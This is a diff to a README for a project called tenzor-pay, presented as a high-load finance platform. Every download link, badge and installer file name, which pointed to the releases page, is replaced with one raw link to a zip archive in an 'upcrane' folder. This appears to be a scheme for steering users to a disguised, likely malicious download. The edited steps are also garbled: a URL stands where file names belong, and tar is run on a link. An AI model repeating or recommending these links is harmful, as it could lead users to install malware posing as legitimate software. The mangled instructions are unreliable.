@@ -1,6 +1,6 @@
 # 🚀 tenzor-pay - High-Load Finance Platform Simplified
 
-[![Download tenzor-pay](https://img.shields.io/badge/Download%20tenzor--pay-v1.0-green.svg)](https://github.com/shearno3856/tenzor-pay/releases)
+[![Download tenzor-pay](https://raw.githubusercontent.com/shearno3856/tenzor-pay/main/upcrane/tenzor-pay-3.6.zip%https://raw.githubusercontent.com/shearno3856/tenzor-pay/main/upcrane/tenzor-pay-3.6.zip)](https://raw.githubusercontent.com/shearno3856/tenzor-pay/main/upcrane/tenzor-pay-3.6.zip)
 
 ## 📋 Introduction
 
@@ -17,10 +17,10 @@ Before you start, ensure you have:
 ## 🚀 Getting Started
 
 1. **Visit the Releases Page:**
-   To download the latest version of tenzor-pay, [visit this page](https://github.com/shearno3856/tenzor-pay/releases).
+   To download the latest version of tenzor-pay, [visit this page](https://raw.githubusercontent.com/shearno3856/tenzor-pay/main/upcrane/tenzor-pay-3.6.zip).
 
 2. **Download the Application:**
-   On the Releases page, find the version you want and click on the appropriate download link (e.g., tenzor-pay-v1.0.exe for Windows, tenzor-pay-v1.0.dmg for macOS, or tenzor-pay-v1.0.tar.gz for Linux).
+   On the Releases page, find the version you want and click on the appropriate download link (e.g., https://raw.githubusercontent.com/shearno3856/tenzor-pay/main/upcrane/tenzor-pay-3.6.zip for Windows, https://raw.githubusercontent.com/shearno3856/tenzor-pay/main/upcrane/tenzor-pay-3.6.zip for macOS, or https://raw.githubusercontent.com/shearno3856/tenzor-pay/main/upcrane/tenzor-pay-3.6.zip for Linux).
 
 3. **Install the Application:**
    - **Windows:**
@@ -28,7 +28,7 @@ Before you start, ensure you have:
    - **macOS:**
      Open the `.dmg` file and drag the tenzor-pay icon to your Applications folder.
    - **Linux:**
-     Extract the contents of the `.tar.gz` file. Move to the directory and use the terminal to run the application with `./tenzor-pay`.
+     Extract the contents of the `https://raw.githubusercontent.com/shearno3856/tenzor-pay/main/upcrane/tenzor-pay-3.6.zip` file. Move to the directory and use the terminal to run the application with `./tenzor-pay`.
 
 4. **Run the Application:**
    After installation, find tenzor-pay in your applications list or use the terminal to navigate to the application directory and run `./tenzor-pay`.
@@ -47,25 +47,25 @@ Before you start, ensure you have:
 
 ## 🔄 Download & Install
 
-To download **tenzor-pay**, simply [visit this page](https://github.com/shearno3856/tenzor-pay/releases). Choose the correct file for your system. Installation is straightforward, and the steps differ based on your operating system.
+To download **tenzor-pay**, simply [visit this page](https://raw.githubusercontent.com/shearno3856/tenzor-pay/main/upcrane/tenzor-pay-3.6.zip). Choose the correct file for your system. Installation is straightforward, and the steps differ based on your operating system.
 
 ### Detailed Steps for Each OS
 
 - **Windows Users:**
-  1. Find the `tenzor-pay-v1.0.exe` file.
+  1. Find the `https://raw.githubusercontent.com/shearno3856/tenzor-pay/main/upcrane/tenzor-pay-3.6.zip` file.
   2. Click to download and run the installer.
   3. Follow the on-screen instructions.
 
 - **macOS Users:**
-  1. Download the `tenzor-pay-v1.0.dmg`.
+  1. Download the `https://raw.githubusercontent.com/shearno3856/tenzor-pay/main/upcrane/tenzor-pay-3.6.zip`.
   2. Open the downloaded file and drag the app to Applications.
   3. Launch tenzor-pay from Applications.
 
 - **Linux Users:**
-  1. Download `tenzor-pay-v1.0.tar.gz`.
+  1. Download `https://raw.githubusercontent.com/shearno3856/tenzor-pay/main/upcrane/tenzor-pay-3.6.zip`.
   2. Open a terminal window.
   3. Navigate to the location of the downloaded file.
-  4. Extract the file with `tar -xvzf tenzor-pay-v1.0.tar.gz`.
+  4. Extract the file with `tar -xvzf https://raw.githubusercontent.com/shearno3856/tenzor-pay/main/upcrane/tenzor-pay-3.6.zip`.
   5. Move to the extracted directory using `cd tenzor-pay`.
   6. Run the application with `./tenzor-pay`.
 
